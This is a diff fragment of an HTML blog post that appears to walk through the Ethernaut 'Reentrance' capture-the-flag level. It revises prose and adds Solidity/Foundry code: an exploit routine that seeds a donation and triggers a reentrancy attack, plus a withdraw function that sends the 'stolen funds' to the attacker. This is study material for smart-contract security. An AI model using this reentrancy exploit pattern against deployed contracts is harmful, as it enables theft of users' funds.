@@ -367,14 +367,27 @@ call:</p>
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>if is less Ether left on the contract than we donated, then we
-just withdraw the remaining funds.</p>
-<p>The <code>withdraw</code> function in the just sends the stolen funds back
-to the attacker (player).</p>
+</span></span></code></pre></div><p>We can withdraw at most what we&rsquo;ve donated. If there is less
+Ether left, then we just withdraw the rest.</p>
+<p>The <code>withdraw</code> function sends the stolen funds back to the
+attacker (player):</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">withdraw</span>() <span style="color:#080;font-weight:bold">public</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> <span style="color:#038">balance</span> = <span style="color:#888;font-weight:bold">address</span>(<span style="color:#038">this</span>).<span style="color:#038">balance</span>;
 </span></span><span style="display:flex;"><span>    (<span style="color:#888;font-weight:bold">bool</span> success, ) = owner.<span style="color:#038">call</span>{<span style="color:#038">value</span>: <span style="color:#038">balance</span>}(<span style="color:#d20;background-color:#fff0f0">&#34;&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#038">require</span>(success, <span style="color:#d20;background-color:#fff0f0">&#34;unable to withdraw&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Then, we set the initial donation to be 1/10 of the <code>Reentrance</code>
+contract&rsquo;s balance and start the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">exploit</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    vm.startPrank(player);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ReentranceExploit expl = <span style="color:#080;font-weight:bold">new</span> ReentranceExploit(level);
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> donation = <span style="color:#888;font-weight:bold">address</span>(level).<span style="color:#038">balance</span> / <span style="color:#00d;font-weight:bold">10</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    expl.run{<span style="color:#038">value</span>: donation}();
+</span></span><span style="display:flex;"><span>    expl.withdraw();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Here is how the forge&rsquo;s trace looks like:</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#038">test</span> --match-contract ReentranceTest -vvvv
